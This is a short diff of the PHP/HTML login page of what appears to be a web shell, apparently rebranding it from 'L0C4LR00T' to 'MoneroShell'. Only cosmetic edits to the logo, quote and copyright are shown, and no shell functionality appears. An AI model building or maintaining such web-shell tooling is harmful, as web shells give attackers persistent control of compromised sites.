@@ -217,14 +217,14 @@ if (is_logged_in()) {
     
     <body>
         <div class="login-form">
-            <h1 class="logo">L0C4L<span>R00T</span></h1>
+            <h1 class="logo">Monero<span>Shell</span></h1>
             <div class="login-box">
                 <?php
                 if (isset($error_message)) {
                     echo "<p class='error'>$error_message</p>";
                 }
                 ?>
-                <p class="quote">My Vengeance Ends Now</p>
+                <p class="quote">SHELL</p>
                 <form method="post">
                     <input type="hidden" name="log" value="login">
                     <div class="inputBox">
@@ -240,7 +240,7 @@ if (is_logged_in()) {
                     </div>
                 </form>
             </div>
-            <div class="copyright"><span>&L0C4LR00T 2024</span></div>
+            <div class="copyright"><span>&MoneroShell 2025</span></div>
         </div>
     </body>
     <audio autoplay="autoplay" loop="loop" id="lagu"src="https://c.top4top.io/m_3230o7fes1.mp3"></audio>
